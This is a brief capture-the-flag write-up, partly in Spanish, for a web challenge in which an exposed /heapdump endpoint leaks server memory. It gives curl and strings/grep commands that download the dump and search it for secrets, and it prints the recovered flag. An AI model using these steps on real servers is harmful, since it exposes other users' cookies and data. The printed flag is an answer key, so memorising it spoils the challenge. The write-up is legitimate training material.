## Descripción
Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.

The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden. The website is running [picoCTF News](http://xebec.cylabacademy.net:38681/).

http://xebec.cylabacademy.net:38681/
## Solución
```
curl -o heapdump.bin http://xebec.cylabacademy.net:38681/heapdump

strings heapdump.bin | grep -i "picoCTF{"

strings heapdump.bin | grep -iE "flag|ctf\{|academy\{"

academy{pat!3nt_15_Th3_K3y_cc0f4fda}
```
## Notas Adicionales
Esto confirma exactamente la mecánica del reto: el endpoint `/heapdump` expone un volcado completo de la memoria del servidor, y dentro de esa memoria quedaron **datos de peticiones/respuestas anteriores** que el proceso había manejado — en este caso, el valor de una cookie que contiene la flag codificada en Base64.
## Referencias
http://xebec.cylabacademy.net:38681/